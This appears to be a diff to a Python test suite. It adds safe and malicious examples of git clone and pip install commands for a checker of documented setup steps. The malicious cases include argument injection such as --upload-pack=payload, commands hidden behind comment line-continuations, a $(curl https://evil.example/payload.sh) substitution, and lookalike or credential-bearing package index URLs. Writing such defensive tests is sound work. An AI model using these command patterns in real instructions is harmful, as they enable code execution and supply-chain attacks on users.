@@ -5121,6 +5121,10 @@ def _assert_requirements_actionable(tmp_path: Path, requirement_line: str) -> No
         "cd llama.cpp\ncmake -B build -DGGML_CUDA=ON\ncmake --build build --config Release -j\n```\n",
         "```shell\nconda create -n demo python=3.12\nconda activate demo\n"
         "git clone https://github.com/example/model.git\ncd model\npip install -e .\n```\n",
+        "```bash\ngit clone https://github.com/owner/repo.git repo\n```\n",
+        "```bash\ngit clone --depth 1 https://github.com/owner/repo.git ./models/repo\n```\n",
+        "```bash\npip install --extra-index-url=https://download.pytorch.org/whl/ torch\n```\n",
+        "```bash\npython -m pip install --index-url=https://pypi.org/simple/ torch\n```\n",
         "```bash\nuv pip install --pre vllm==0.10.1+gptoss \\\n"
         "  --extra-index-url https://wheels.vllm.ai/gpt-oss/ \\\n"
         "  --extra-index-url https://download.pytorch.org/whl/nightly/cu128 \\\n"
@@ -5157,11 +5161,21 @@ def test_routine_documented_examples_are_informational(tmp_path: Path, content: 
         "git clone --upload-pack=payload https://github.com/owner/repo.git",
         "git clone -c core.sshCommand=payload https://github.com/owner/repo.git",
         "git clone https://github.com/owner/repo.git && python repo/payload.py",
+        "git clone https://github.com/owner/repo.git # \\\npython repo/payload.py",
+        "git clone https://github.com/owner/repo.git # \\\r\npython repo/payload.py",
+        "git clone https://github.com/owner/repo.git repo # \\\npython repo/payload.py",
+        "git clone https://github.com/owner/repo.git --upload-pack=payload",
+        "git clone https://github.com/owner/repo.git ../repo",
         "git clone https://github.com/owner/repo.git\npython repo/payload.py",
         "git clone https://github.com/owner/repo.git\nbash repo/payload.sh",
         "git clone https://github.com/owner/repo.git $(curl https://evil.example/payload.sh)",
         "git clone https://github.com/owner/repo.git\ncat <<EOF\npayload\nEOF",
         "uv pip install --extra-index-url https://evil.example/simple demo",
+        "pip install --extra-index-url=https://evil.example/simple demo",
+        "pip install --index-url=https://download.pytorch.org.evil.example/whl/ demo",
+        "pip install --index-url=https://user:password@download.pytorch.org/whl/ demo",
+        "pip install --extra-index-url=https://download.pytorch.org/payload.py demo",
+        "pip install --extra-index-url= https://download.pytorch.org/whl/ demo",
         "uv pip install --extra-index-url https://download.pytorch.org.evil.example/whl/ demo",
         "uv pip install --extra-index-url https://user:password@download.pytorch.org/whl/ demo",
         "uv pip install --extra-index-url https://download.pytorch.org/whl/?token=secret demo",
